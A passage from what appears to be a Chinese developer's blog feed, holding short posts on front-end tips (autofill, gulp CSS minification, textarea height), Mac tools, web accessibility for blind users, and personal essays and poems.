的时候进入了别人的代码领域，对着别人巨长而又没什么注释的代码，估计当场就晕了，更晕的是，自己却还在怀疑这到底是不是这堆代码里头的问题。团队合作中，我们心里默认相信队友，队友产出的代码是没有问题可以直接拿过来使用的，所以一旦出现问题，我们怀疑更多的是自己，质疑别人需要很大的勇气，尤其是质疑那些成熟的框架，用了很多年的代码。</p><p>那么如何踩坑呢？我们可不喜欢踩坑，有的坑踩进去就跳不出来了，最后只能选择其他方案处理。很少有前端同学写程序的测试用例，可能还有一部分同学根本就没听说过什么测试用例。而在后端中（比如nodejs）没有测试用例的代码就是一堆废代码，除了自己可以拿着用用，别人根本就不敢用的。那么测试用例会考虑做那些事情呢？简单点说：</p><ul class="task-list"><li>写出有问题的代码，让程序按照期望的出错方式出错，如果没有，程序就有bug</li><li>写出没问题的代码，让程序按照正常的流程返回正确的结果，如果没有，程序就有bug</li></ul><p>测试用例要覆盖到程序中所有的逻辑判断，比如 if elseif else 等判断的逻辑都要覆盖进去。当我们的测试代码覆盖了100%的逻辑，那坑位就展露无遗了。</p><p>埋坑人的致命弱点就是很少对程序作出异常情况判断，只要找出程序中的异常点，试图以另类的方式触发这个异常，你就顺利踩坑了！</p><h4><span><strong><a id="user-content-3-用力填坑" class="anchor"></a><span>3. 用力填坑</span></strong></span></h4><p>首先，填坑是一种责任。</p><p>发现问题是最难的，解决问题只是时间的问题。当我们确认了一个坑之后，第一件事情就是告诉别人这里有坑，你不要踩了。但是最好再多补一句话：你先别踩，等我填好了坑你再来。我这觉得这句话真的很暖人心，程序猿之间的关怀就应该这么赤裸裸的。尽管，有的时候，这个坑不是你挖的..</p><p>当我们挖好坑，踩完坑，再埋好坑之后，回头想想自己在团队中扮演什么样的角色，挖坑者还是埋坑者？这必然是有益于成长的。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>干掉浏览器中的自动填充</title>
      <link href="/blog/2015/03/31/autocomplete-in-browser/"/>
      <url>/blog/2015/03/31/autocomplete-in-browser/</url>
      
        <content type="html"><![CDATA[<p>当我们在 chrome 浏览器中填写表单之后，如果表单中包含密码域，浏览器将会提示用户是否记住密码。一旦记住密码，即便这次填写的是错误的，下次登录时浏览器也会任性的给你自动填充信息。</p><p>这是开发者不喜欢看到的，对用户来说，也是不太安全的，通过</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;passwordInput&quot;</span>).<span class="property">value</span>)</span><br></pre></td></tr></table></figure><p>就能拿到密码明文。虽加强了体验，但削弱了安全性，也让有「强迫症」的程序员感到颇为不爽。</p><p>当页面加载的时候直接将表单域设置为空，貌似是不起作用的。原因是，浏览器在页面加载到一定程度时（我也不知道是什么时机）从自己的数据库中挖出曾经保存的表单域，填充进去。</p><p>有人想到使用定时器，检测表单是否存在数据，这样的操作费时费力，不提倡。</p><p>可以考虑这个方案：</p><p>每个 <code>input</code> 都有 <code>defaultValue</code> 属性，这是 DOM 初始化的时候给它加上的，判断</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">input.<span class="property">defaultValue</span> == input.<span class="property">value</span>  </span><br><span class="line"><span class="comment">// 如果相等则不处理，如果不相等则将 value 置为空</span></span><br></pre></td></tr></table></figure><p>感觉是，是靠谱的！</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chrome </tag>
            
            <tag> autocomplete </tag>
            
            <tag> 自动填充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac下的效率工具autojump</title>
      <link href="/blog/2015/03/30/autojump-in-mac/"/>
      <url>/blog/2015/03/30/autojump-in-mac/</url>
      
        <content type="html"><![CDATA[<p>IDE 用起来总是得不到满足，Mac 适合搞开发，我也十分喜欢 Mac 系统，当然可以说喜欢 Unix&#x2F;Linux 系统。今天在 <code>.zshrc</code> 文件中添加了这么几行快捷命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> gow   = <span class="string">&quot;cd ~/barretlee/work&quot;</span></span><br><span class="line"><span class="built_in">alias</span> gotb  = <span class="string">&quot;cd ~/barretlee/work/tb&quot;</span></span><br><span class="line"><span class="built_in">alias</span> gotbn = <span class="string">&quot;cd ~/barretlee/work/tb/node&quot;</span> </span><br></pre></td></tr></table></figure><p>写完之后我立马把这几行命令删掉了，这种方式似乎有点二。网上搜罗了下，找到了一个挺不错的工具 - autojump。</p><p>Autojump 自己是这么描述的：</p><blockquote><p>autojump  is  a  faster way to navigate your filesystem.  It works by maintaining a database of the directories you use the most from the command line.</p></blockquote><p>通过 <code>history</code> 命令你可以找到最近用过的命令，比如</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span> | grep <span class="string">&quot;git clone&quot;</span></span><br></pre></td></tr></table></figure><p>通过上述命令就能找到近期 clone 了哪些库，省却了写一堆代码的功夫。autojump 就是通过记录你在 history 中的行为把你访问过的文件夹路径都 cache 下来，当你进行如下操作时：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">autojump node</span><br></pre></td></tr></table></figure><p>他会直接跳到之前访问的 <code>~/barretlee/work/tb/node</code> 目录下。他还有一个快捷方式：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">j node</span><br></pre></td></tr></table></figure><p>我很喜欢这个小工具，让我游荡于文件夹之间不费吹灰之力。</p><h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><ul><li><p>建议安装 zsh</p></li><li><p>建议安装 homebrew</p></li><li><p><code>brew install autojump</code></p></li><li><p>在 <code>.zshrc</code> 中找到 <code>plugins= </code>，在后面添加 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=(git autojump)</span><br></pre></td></tr></table></figure></li><li><p>然后继续在上述文件中添加 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.sh</span><br></pre></td></tr></table></figure></li><li><p><code>source ~/.zshrc</code></p></li></ul><p><strong>Enjoy coding. :)</strong></p>]]></content>
      
      
      <categories>
          
          <category> 苹果 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
            <tag> 效率 </tag>
            
            <tag> autojump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac数据迁移xcode错误问题</title>
      <link href="/blog/2015/03/29/mac-backup-about-xcode/"/>
      <url>/blog/2015/03/29/mac-backup-about-xcode/</url>
      
        <content type="html"><![CDATA[<p>在安装 Homebrew (Mac 下的软件管理工具，类似 linux 的 apt-get、yum 等)的时候，系统报错：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xcode-select: error: <span class="built_in">command</span> line tools are already installed, use <span class="string">&quot;Software Update&quot;</span> to install updates</span><br></pre></td></tr></table></figure><p>网上搜罗了下，是 xcode 直接从其他电脑复制过来导致的问题，可以执行以下命令查看他的来源：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xcode-select -p</span><br></pre></td></tr></table></figure><p>果然，返回的结果是：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/Volumes/Macintosh HD/Applications/Xcode.app/Contents/Developer</span><br></pre></td></tr></table></figure><p>一个错误的路径，<code>Macintosh HD</code> 是另一台电脑的硬盘名称，处理方式也比较简单，将路径修改过来：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo xcode-select --switch /Library/Developer/CommandLineTools</span><br></pre></td></tr></table></figure><p>验证方式：在命令行输入 <code>gcc</code>，如果没有报出之前的错误（xcode-select: error: …) 就 ok 了。</p>]]></content>
      
      
      <categories>
          
          <category> 苹果 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
            <tag> 数据迁移 </tag>
            
            <tag> xcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac数据克隆</title>
      <link href="/blog/2015/03/28/mac-data-backup/"/>
      <url>/blog/2015/03/28/mac-data-backup/</url>
      
        <content type="html"><![CDATA[<p>IT人士，尤其是前端，现在都偏爱 mac，很多人自己买了 mac，公司也给配了一台。最近因为工作需求就申请了一台 mac pro，那么，问题来了，我是个懒蛋，我可不喜欢把软件都重新安装一遍，过两天就要上班了，配置好工作环境颇为紧急。</p><p>咨询了下有经验的朋友，一般的处理有两种方式：</p><ol><li>使用 Mac 自带的 Time Machine，这个速度我看了下，136G 的东西备份过去需要接近 1 个小时，Time Machine 是个不错的东西，但是苹果的硬盘一般不会很大，定制大容量硬盘的土豪咱们先不理会。</li><li>使用雷电线，将旧电脑设置成「目标磁盘模式」(系统设置-&gt;启动磁盘-&gt;目标磁盘模式)，使用雷电线连接新旧电脑，重启旧电脑，此时旧电脑就会以磁盘形式挂载在新电脑上。</li></ol><p>我没尝试第一种方式，136G 数据的备份是备份到我的移动硬盘中。雷电线，其实我也不知道这个叫法正不正确，他就是两端都能插入电脑的线(扩展屏接口位置插入)。</p><p>备份的方式也比较原始，复制 &amp; 粘贴。之所以叫做雷电线应该是传输的速度飞快吧，”咔咔”两下数据就全部过来了。</p><p>最头疼的软件，虽然可以直接把 <code>/Application</code> 下的数据 copy 到新电脑，但软件的很多配置信息都没有了，都得重新搞一次。还有命令行相关的就只能手动再搞一次，不知道是否有其他方案？</p><p>暂记于此。</p>]]></content>
      
      
      <categories>
          
          <category> 苹果 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
            <tag> TimeMachine </tag>
            
            <tag> 数据备份 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gulp打包压缩css遇到的坑</title>
      <link href="/blog/2015/03/26/attention-in-gulp-minify-css/"/>
      <url>/blog/2015/03/26/attention-in-gulp-minify-css/</url>
      
        <content type="html"><![CDATA[<p>很久没过来记录了，今天遇到了个坑，很坑的坑。</p><p>之前看过一些 gulp 和 grunt 相关的东西，但是没怎么用，有一次做项目用到，不过那次做的是一个监控系统，内部用，不要考虑兼容性问题，今天在处理业务的时候，用到了 gulp。</p><p>业务的老代码，不算很陈旧，2013年的（尚好是吧~）,那个时候也没啥太好用的压缩工具，翻出来的代码也没有一个默认的脚本可以自动打包，于是就用上了 gulp。</p><p>css 打包代码：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">gulp<span class="selector-class">.task</span>(&#x27;css&#x27;, function()&#123;</span><br><span class="line">  gulp<span class="selector-class">.src</span>(&#x27;<span class="attribute">src</span><span class="comment">/**/</span>*<span class="selector-class">.css</span>&#x27;)</span><br><span class="line">    <span class="selector-class">.pipe</span>(gulp<span class="selector-class">.dest</span>(&#x27;build&#x27;))</span><br><span class="line">    <span class="selector-class">.pipe</span>(minicss())</span><br><span class="line">    <span class="selector-class">.pipe</span>(rename(&#123;</span><br><span class="line">      suffix:<span class="string">&quot;-min&quot;</span></span><br><span class="line">    &#125;))</span><br><span class="line">    <span class="selector-class">.pipe</span>(gulp<span class="selector-class">.dest</span>(&#x27;build&#x27;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>坑在哪里呢，没仔细看文档，<code>gulp-minify-css</code> 这个 gulp 插件就直接用上了，没想到他竟然把所有的低版本IE hack代码给干掉了，哭…</p><p>同学们要引起注意，记得在 minicss() 中送入参数：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compatibility&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ie7&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>具体其他配置请移步<a href="//github.com/jakubpawlowicz/clean-css#how-to-set-compatibility-mode">官方文档</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hack </tag>
            
            <tag> gulp </tag>
            
            <tag> minifycss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我没什么可以失去的</title>
      <link href="/blog/2015/02/10/%E6%88%91%E6%B2%A1%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E5%A4%B1%E5%8E%BB%E7%9A%84/"/>
      <url>/blog/2015/02/10/%E6%88%91%E6%B2%A1%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E5%A4%B1%E5%8E%BB%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<p>高中毕业之后，便感觉自己缺少敬畏之心，总是挑战“权威”，也敢于对很多事情说「不」。</p><p>面对一个新的事物、新的观点，我很少用肯定的态度看待。脑海中闪过的第一个念头便是，这东西不好，是错的，存在问题，不可取…直到慢慢的发现它的好。</p><p>我喜欢逻辑性很强的电视剧、小说、影片，一旦从屏幕中发现了不合理的内容，便立生厌恶，心底冒出“烂片”二字。</p><p>抉择的时候，我相信瞬间的判断。</p><p>我始终相信一个东西只要存在，就有他的合理性，即便是天下人都在排斥，我都会为他辩驳，为他寻找自身存在的理由。</p><p>我的消费观念是，钱可以乱花，因为他只是几张纸，但是东西不能浪费。我很节制的使用资源，水、米饭、电。糟糕厨师烧出来的菜，我会想红军长征的时候他们在吃什么，然后不知不觉把东西吃光。</p><p>我总是在最累的时候做更累的事情。停不下来，直到濒临崩溃。</p><p>我没什么可以失去的，所以我总是放开胆子拼搏。</p><p>我相信未来是可以创造的。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2015，充满未知</title>
      <link href="/blog/2015/01/01/2015%EF%BC%8C%E5%85%85%E6%BB%A1%E6%9C%AA%E7%9F%A5/"/>
      <url>/blog/2015/01/01/2015%EF%BC%8C%E5%85%85%E6%BB%A1%E6%9C%AA%E7%9F%A5/</url>
      
        <content type="html"><![CDATA[<p>很清楚地记得，十二年前，我家是个小平房，屋檐前边有一排石棉瓦，用五根杯口粗的空心铁柱子撑起，遮风挡雨。</p><p>下午五六点我从学校蹦哒着跑回来，爸妈还在外头忙着，我没进门，直接去了隔壁小胖家。小胖的妈妈问我要不要在她家吃饭，我说不用，我爸妈等会儿就回来。</p><p>夜色朦胧，我拖着书包走到那片石棉瓦下，没开门，抱着柱子，等着。门前是条大马路，车来车往。但夜色笼罩下的乡村十分宁静，马路上也只有稀疏的几盏车灯亮过。</p><p>踮起脚尖，探望前方依稀明亮的车灯。嗯，应该是爸妈回来了。左侧亮起的车灯又从右侧暗淡下去，直到留下全部的夜色，继续伸出脖子观望…</p><p>时隔十二年，我也已经长成了一个青年。</p><p>离开象牙塔后直奔北京、杭州。繁华的大都市，生活节奏远不是乡下可以比拟。每每用尽全力去寻找出路，每每都吃尽苦头。现在，我在杭州一隅。</p><p>去过好几次西湖，人头攒动，异常热闹。今天，路过西湖，踏着步子，随意走了几步，一个人。</p><p><img src="/../blogimgs/2015/01/01/5B9F5D5BF1977B7DAA99C06DE7E5847B.png" alt="西湖随拍"><!--<source src="http://barretlee.com/life/content/images/2015/Jan/5B9F5D5BF1977B7DAA99C06DE7E5847B.png">--></p><p>阳光很刺眼，风也很大。</p><p>下午四点多，该回家了。站在马路牙子上，又是观望。上不去挤满了游客的194，招不到回家的的士。最后上了辆黑的，不打表，价格double，招客、拼车，路上还想甩客…平时一个小时的路程，因为堵车，加上黑的绕道载客，走了两个小时。</p><p>回家的路上寒风又开始肆意，吹得心很凉。</p><p>告别了颠簸的2014，人好像变得傻乎乎的。2015的就第一天过的也是如此的糟糕，人家的「狗屎运」在我这里总会少个「运」字。</p><p>本文的标题本来是『有一种痛，叫孤单』，写着写着却成了新年展望，那也不妨来展望一下。</p><p><strong>关于工作</strong></p><p>最近找我的猎头不少，师兄说过段时间他们找多了，挖不动就会停下来的。我内心期待稳定，稳定的工作环境，稳定的收入。但是目前来看，似乎算不上稳定，稍微生个大病估计就会回到解放前。</p><p>也有不少创业团队希望可以找到年轻有理想的小伙伴出去拼搏，我动心过，我也是一个不甘平庸的人，不过还是放弃了。因为，我还不够。</p><p>我想，2015年，我的工作是稳定的。</p><p><strong>关于爱情</strong></p><p>我曾经对自己说，24岁开始恋爱，好像这不太对。寻找一个能够厮守终生的人本身就是一件特别难得的事情，如果碰到了对的人，那就应该去做对的事情。</p><p>我的爱情宣言，引用一个小伙伴说的话：“找一个自己喜欢的人谈恋爱，找一个喜欢自己的人结婚。”</p><p><strong>关于身体</strong></p><p>2014，睡觉时间平均下来，应该是1点钟睡，9点起床。几乎不运动，爬过几次山，所以肉自然就多了。可以看看三年前的我：</p><p><img src="/../blogimgs/2015/01/01/avatar.jpg" alt="three years ago"><!--<source src="http://barretlee.com/life/content/images/2015/Jan/avatar.jpg">--></p><p>现在的我：</p><p><img src="/../blogimgs/2015/01/01/058E64230E3AF81806B5CFA6E53F465F.jpg" alt="now"><!--<source src="http://barretlee.com/life/content/images/2015/Jan/058E64230E3AF81806B5CFA6E53F465F.jpg">--></p><p>我反正看不出这是同一个人，除了都有胡子。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我最近两周的生活</title>
      <link href="/blog/2014/12/23/%E6%88%91%E6%9C%80%E8%BF%91%E4%B8%A4%E5%91%A8%E7%9A%84%E7%94%9F%E6%B4%BB/"/>
      <url>/blog/2014/12/23/%E6%88%91%E6%9C%80%E8%BF%91%E4%B8%A4%E5%91%A8%E7%9A%84%E7%94%9F%E6%B4%BB/</url>
      
        <content type="html"><![CDATA[<p>现在的心情是十分沮丧的，所以不免说出些沮丧的话来。最近两周的生活有焦点，但却出现了两个焦点，一个让人激情澎湃，一个让人无限低糜，所以心很乱。</p><p>当生活有了圆心，就会出现半径。半径虽时大时小，环绕在一个圈子里，人却总是幸福的。但圈子的半径也会时常接近于零，那时自己没了跻身之地，就感觉被整个世界嫌弃。</p><p>我一直在寻找一个可以作为我人生导向的圆心。把心放在那里，我去寻找更大的半径。可是好难。就像漂泊在大海上，不知道何时下锚，也找不到岸。所以会很累。</p><p>人一旦有了疲惫感就容易放弃。放弃所爱的，放弃所想的，甚至会放弃自己。疲惫的人渴望有一面不冷的墙可以倚靠，疲惫的心需要有人献出一丝关怀。可我是个奇葩，越是疲惫，越是屹立不倒，直到…倒下。</p><p>我讨厌等待，但不得不等待；我讨厌漫长的等待，但偏偏就是漫长的；我讨厌没有结果的等待，但结果偏偏就是未知的。所以我很急于翻开书的下一页，看看故事是如何发展的，我就是这么个急性子。</p><p>很开心老大把淘宝首页的工作交给了我，更开心的是我发现这件事竟然如此地具有挑战性，所以我会做好它。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>也让盲人拥抱互联网</title>
      <link href="/blog/2014/12/21/cb-wai/"/>
      <url>/blog/2014/12/21/cb-wai/</url>
      
        <content type="html"><![CDATA[<p>中国盲人人数已经超过了600万，平均每200多人中就有一位是盲人，这个规模还是相当庞大的。由于视觉障碍，盲人同这个世界的交集小了很多，但互联网的的发展为他们打开了一扇与更多人交流的窗口。</p><p><img src="https://images.cnitblog.com/blog/387325/201412/211619123902315.png" alt=""></p><p>[图片取自<a href="http://news.lnd.com.cn/htm/2010-12/01/content_1634981.htm">网络</a> - 吴铸上网只需要键盘、音响和麦克]</p><p>这个窗口的开关掌握在我们工程师手中！我们有义务也有责任为他们开窗！</p><h3>一、上网的盲人用户和统计方式</h3><p>盲人中真正有条件并且会上网的有多少呢？我们一开始就遇到了一个难题：如何判断用户是盲人用户？</p><p>视障人士主要通过读屏软件来获取网页信息，苹果的产品自带 VoiceOver，感兴趣的同学可以体验下。这里有一篇 VoiceOver 的<a href="http://bbs.feng.com/read-htm-tid-3042656.html">使用教程</a>，学会使用并不难，难的是把耳朵当眼睛使的繁琐。</p><p>PC 上和 mobile 上，盲人与机器的交互方式完全不一样，PC 上主要使用键盘操作，读屏软件提供了很多的快捷键，如果操作熟练，速度也是杠杠的！（只不过现在的软件很少提供和谐的文字引导，导致盲人使用起来受阻，webpages也是如此）而 mobile 中，盲人通过触摸屏的滑动获知页面信息，两种读屏就需要我们使用两种方式去判断。</p><h4>1. PC</h4><p>在读取屏幕时，tab 是使用最频繁的键，当然还有 shift+tab，两个操作键的作用，前者是向下一个可聚焦元素聚焦，聚焦上去之后读屏软件会读取元素属性，如果是文字，会读取文字内容，如果是图片，就读取图片 alt 内容。后者是向前聚焦。</p><p>所以我们就想到，<strong>通过监听 window 的 tab 点击事件，在规定时间内有连续多次触发该事件则认定该用户为无障碍受众用户</strong>。经过讨论，我们把连续点击次数设定为 10 次，监听到连续 10 次之后，发送统计，销毁事件。</p><h4>2. Mobile</h4><p>Mobile 上的统计是件麻烦事儿，没有键盘操作，只有 touch 屏幕，通过用户手势去判断这条路不可走，一方面是因为读屏软件的手势不在 web 页面的监控范围内，另一方面，手势动作判断实在是麻烦。</p><p>经过多次讨论，继续使用 PC 端的方案。TAB 键会让页面元素聚焦，那么我们在 Mobile 就监听元素的聚焦事件。<strong>监听所有元素的focus事件，在规定事件内有连续3次触发该事件则认定该用户为无障碍受众用户：发送统计，销毁事件</strong>。这里我们将触发次数修改成了 3，主要是因为 Mobile 可操作区域并不大，三两下操作就跳转到下一个页面了。</p><h3>二、网页中普遍存在的『有障碍』访问问题</h3><h4>1. img 标签无 alt 属性，不可读</h4><p>图片是电商网站中最重要的角色，但是盲人的世界里没有可视化的图片，如果页面上的 img 标签不加 alt 属性，对盲人来说这就是个无用网站。<strong>让图片可读，一件可轻松搞定的事情，却可以造福千千万万的视障人士，你值得去做！</strong></p><h4>2. 可操作元素，无法聚焦</h4><p>诸如此类的 tab 切换随处可见，</p><p><img src="https://images.cnitblog.com/blog/387325/201412/211619204525152.png" alt=""></p><p>网页可聚焦的元素不多，a、input、button、area 等等不到十个。我们通常使用 li 元素作为 tabHeader 的切换元素，这种情况下，盲人使用键盘操作是没有办法聚焦上去的，结果就是很多内容查看不到。</p><p><strong>这是一个容易被忽略，但是影响面极广的问题，希望大家可以重视！</strong> 解决方案很简单，给元素加个 tabIndex 属性。</p><h4>3. 模板渲染页面后，焦点停靠不合理</h4><p>两个十分让盲人受伤的问题：</p><ul><li><strong>焦点本来聚焦到 A 区块的某个元素，通过 ajax 重新渲染 A 区块之后，页面失去焦点</strong></li><li><strong>从导航栏直接跳转到某个锚点位置，但是焦点没有跟着一起指向锚点区域的第一个元素</strong></li></ul><p>从体验上来看，上面两个问题都是糟糕透了！但是我们只需要在 js 中附加一句</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;.destination:first-child&quot;</span>).focus()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之类的，<strong>一句简单代码搞定所有视障用户的痛！</strong></p><h4>4. 标签语义化不够</h4><p>读屏软件有个比较给力的快捷键，他可以让用户快捷的定位 Header 标签，这样可以减少使用很多次 tab。在我们的双十二活动页面中，很多页面都有商品楼层，每个楼层都有一个标题，但是部分页面中我们的工程师并没有使用 H 标签而是 div 标签来标识标题（有时候标题是个图片），这一点让盲人郁闷至极。</p><h3>三、『有障碍』问题的解决方案</h3><p><strong>我们重点做一件事情&mdash;&mdash;让所有的图片可读！</strong></p><p>关于网页无障碍的内容，w3c 提出了一堆规范（相关信息可以查阅 <a href="http://www.w3.org/WAI/">WAI</a>），如果按照规范来找问题，那我们的工程师有的忙了。所以我们挑了几个影响最广泛的点进行单点突击！</p><p>第一步就是让所有的图片可读，不管是后端直接输出、TMS渲染、前端异步加载渲染的图片，全部加上 alt 标签，这是最简单的操作，也是推动起来最简单的点。当然，最后，我们的盲人测试团队的反馈是：图片可读这块做的很棒！</p><p>第二步就是扫清所有通向下一步（或者说通向支付）的网页障碍，一个流程下来，我们希望每个在淘宝上购买商品的盲人都能够成功支付。</p><p><strong>很显然，上面提到的解决方案都是人为去推，这种方式是不长久的，我们希望所有的工程师都有这种意识，主动去改善网页的可读性。</strong></p><h3>四、小结</h3><p>先说说现在存在的问题，概括性讲，有三点：</p><ol><li>不知道无障碍</li><li>不知道做什么</li><li>知道无障碍但是推不动</li></ol><p>为此我们无障碍小组也进行了脑暴：</p><ul><li>工具/平台上集成，比如给 img 标签强制或者自动加上 alt 属性</li><li>国外开发的无障碍检测工具，移植过来，搭建测试平台</li><li>页面结构化，使用元数据/元编程</li><li>无障碍方面编程的规范化，白皮书</li><li>接入到测试流程中</li><li>....</li></ul><p>想了很多点子。我们的目标很明确：<strong>让网页可读，对盲人易用。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> WAI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>种子，的迷惘</title>
      <link href="/blog/2014/12/18/%E7%A7%8D%E5%AD%90%EF%BC%8C%E7%9A%84%E8%BF%B7%E6%83%98/"/>
      <url>/blog/2014/12/18/%E7%A7%8D%E5%AD%90%EF%BC%8C%E7%9A%84%E8%BF%B7%E6%83%98/</url>
      
        <content type="html"><![CDATA[<p>呼吸的痛，难以破壳</p><p>狭小，黑暗，凄冷</p><p>期待着阳光</p><p>生命残喘之际，迷惘了</p><p>活着，还是沉寂</p><p>风依然瑟瑟的刮着</p><p>只是，没了寒意</p><p>休眠吧</p><p>没力气挣扎了</p><p>可，种子知道</p><p>休眠就是永别</p><p>好冷…</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>种子，的眺望</title>
      <link href="/blog/2014/12/14/%E7%A7%8D%E5%AD%90%EF%BC%8C%E7%9A%84%E7%9C%BA%E6%9C%9B/"/>
      <url>/blog/2014/12/14/%E7%A7%8D%E5%AD%90%EF%BC%8C%E7%9A%84%E7%9C%BA%E6%9C%9B/</url>
      
        <content type="html"><![CDATA[<p>一颗种子，飘落在土地上，不经意地</p><p>没怎么理会，它竟然萌芽了</p><p>种子不适应这个季节，一直处于发芽状态，很吃力</p><p>它想发芽，很想</p><p>露出一头</p><p>太冷，又缩了回去</p><p>它知道露出头就意味着失去自己</p><p>它使劲的汲取养分</p><p>在残缺外壳的包裹下等待生命的怒放</p><p>壳缝中感受太阳的丝丝温暖</p><p>更多的却还是在凄冷中颤抖</p><p>种子知道，春天不远，但需要静静等待。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>textarea高度自适应</title>
      <link href="/blog/2014/12/04/textarea-auto-height/"/>
      <url>/blog/2014/12/04/textarea-auto-height/</url>
      
        <content type="html"><![CDATA[<p>问题：textarea数据是数据库直接输出填充，请问如何做到自适应?</p><p>回答：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tt = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;textarea&quot;</span>).<span class="title function_">item</span>(<span class="number">0</span>),</span><br><span class="line">    len = tt.<span class="property">value</span>.<span class="property">length</span>,</span><br><span class="line">    width = tt.<span class="property">clientWidth</span>,</span><br><span class="line">    style = (<span class="variable language_">window</span>.<span class="property">getComputedStyle</span></span><br><span class="line">                ||<span class="keyword">function</span>(<span class="params">a</span>)&#123;<span class="keyword">return</span> a.<span class="property">currentStyle</span>&#125;)(tt, <span class="literal">null</span>),</span><br><span class="line">    fs = <span class="built_in">parseInt</span>(style[<span class="string">&#x27;font-size&#x27;</span>]) || <span class="number">12</span>,</span><br><span class="line">    lh = <span class="built_in">parseInt</span>(style[<span class="string">&#x27;line-height&#x27;</span>]) || fs * <span class="number">1.2</span>;</span><br><span class="line"></span><br><span class="line">tt.<span class="property">style</span>.<span class="property">height</span> = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(len / (width / fs)) * lh + <span class="string">&quot;px&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里需要注意的是：</p><ul><li>line-height 可能是 normal&#x2F;inherit 之类的值，所以最好加上一个默认值</li><li>上面算法适合等宽字体</li><li>防止计算误差，使用 Math.ceil 函数，比较靠谱的方式是 Math.ceil(len &#x2F; (width &#x2F; fs) - 1)，可以少一行~</li></ul><p>当然，最简单的方式莫过于：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">tt.<span class="property">onpropertychange</span> = tt.<span class="property">oninput</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">height</span> = <span class="variable language_">this</span>.<span class="property">scrollHeight</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>虽然 css 也可以做到，但效果并不是很好：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.tt</span> &#123;</span><br><span class="line">    <span class="attribute">overflow-x</span>: hide;</span><br><span class="line">    <span class="attribute">overflow-y</span>: visible;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span 